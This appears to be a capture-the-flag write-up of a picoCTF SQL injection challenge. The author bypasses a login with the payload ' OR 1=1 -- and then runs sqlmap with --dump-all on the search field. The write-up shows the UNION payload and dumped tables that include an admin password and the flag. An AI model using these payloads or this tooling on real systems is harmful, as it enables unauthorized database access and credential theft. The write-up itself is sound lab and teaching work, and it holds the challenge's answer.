# More SQLi

> Can you find the flag on this website.

The site displays a login-field first. Let's just try to enter a login combination. It returns the SQL query used to (try to) log in:

```
username: arthur
password: examplepw
SQL query: SELECT id FROM users WHERE password = 'examplepw' AND username = 'arthur'
```

The following query would let us in I think:

```
SELECT id FROM users WHERE password = '' OR 1=1 -- AND username = 'arthur'
```

So as password I enter `' OR 1=1 --` and username remains unchanged. This works:

![](https://i.imgur.com/sQ2zLyv.png)

Now we still have to find a flag though. Something tells me the search field is going to be vulnerable again... but let's just move to more professional tooling. I find UNION-based attacks very tiring to do manually (and I'm just a bit lazy...) `sqlmap` to the rescue!

```
┌──(kali㉿kali)-[~/PicoCTF2023/more-sqli]
└─$ sqlmap -u http://saturn.picoctf.net:54230/welcome.php --cookie="PHPSESSID=d7b7m7n113hb82b0cqft254mh6" --data="search=abc" --dbms=sqlite --dump-all
        ___
       __H__                                                                                                      
 ___ ___[,]_____ ___ ___  {1.6.11#stable}                                                                         
|_ -| . [)]     | .'| . |                                                                                         
|___|_  ["]_|_|_|__,|  _|                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:02:17 /2023-05-27/

[21:02:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=abc' UNION ALL SELECT NULL,CHAR(113,106,112,120,113)||CHAR(69,69,118,72,107,113,83,68,117,119,118,67,97,103,71,76,71,105,80,113,71,74,67,90,87,113,80,122,103,86,114,87,79,71,113,74,82,112,106,72)||CHAR(113,113,118,112,113),NULL-- XCmT
---
[21:02:17] [INFO] testing SQLite
[21:02:17] [INFO] confirming SQLite
[21:02:17] [INFO] actively fingerprinting SQLite
[21:02:17] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3
back-end DBMS: SQLite
[21:02:17] [INFO] sqlmap will dump entries of all tables from all databases now
[21:02:17] [INFO] fetching tables for database: 'SQLite_masterdb'
[21:02:17] [INFO] fetching columns for table 'users' 
[21:02:17] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+----+-------+----------------+
| id | name  | password       |
+----+-------+----------------+
| 1  | admin | moreRandOMN3ss |
+----+-------+----------------+

[21:02:17] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/users.csv'                                                                        
[21:02:17] [INFO] fetching columns for table 'hints' 
[21:02:17] [INFO] fetching entries for table 'hints'
Database: <current>
Table: hints
[3 entries]
+----+------------------------+
| id | info                   |
+----+------------------------+
| 1  | Is this the real life? |
| 2  | Is this the real life? |
| 3  | You are close now?     |
+----+------------------------+

[21:02:17] [INFO] table 'SQLite_masterdb.hints' dumped to CSV file '/home/kali/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/hints.csv'                                                                        
[21:02:17] [INFO] fetching columns for table 'offices' 
[21:02:17] [INFO] fetching entries for table 'offices'
Database: <current>
Table: offices
[8 entries]
+----+----------+--------------------+---------------------------------+
| id | city     | phone              | address                         |
+----+----------+--------------------+---------------------------------+
| 1  | Algiers  | +246 8-616 99 40   | Birger Jarlsgatan 7, 4 tr       |
| 2  | Bamako   | +249 173 329 6295  | Friedrichstraße 68              |
| 3  | Nairobi  | +254 703 039 810   | Ferdinandstraße 35              |
| 4  | Kampala  | +256 720 7705600   | Maybe all the tables            |
| 5  | Kigali   | +250 7469 214 950  | 8 Ganton Street                 |
| 6  | Kinshasa | +249 89 885 627 88 | Sternstraße 5                   |
| 7  | Lagos    | +234 224 25 150    | Karl Johans gate 23B, 4. etasje |
| 8  | Pretoria | +233 635 46 15 03  | 149 Rue Saint-Honoré            |
+----+----------+--------------------+---------------------------------+

[21:02:17] [INFO] table 'SQLite_masterdb.offices' dumped to CSV file '/home/kali/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/offices.csv'                                                                    
[21:02:17] [INFO] fetching columns for table 'more_table' 
[21:02:17] [INFO] fetching entries for table 'more_table'
Database: <current>
Table: more_table
[2 entries]
+----+---------------------------------------------------------+
| id | flag                                                    |
+----+---------------------------------------------------------+
| 1  | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} |
| 2  | If you are here, you must have seen it                  |
+----+---------------------------------------------------------+

[21:02:18] [INFO] table 'SQLite_masterdb.more_table' dumped to CSV file '/home/kali/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/more_table.csv'                                                              
[21:02:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/saturn.picoctf.net'                                                                                                                
[21:02:18] [WARNING] your sqlmap version is outdated

[*] ending @ 21:02:18 /2023-05-27/
```

The flag is in the last table. As we actually needed to enumerate the tables to find this, I'm glad I used automated tooling :)
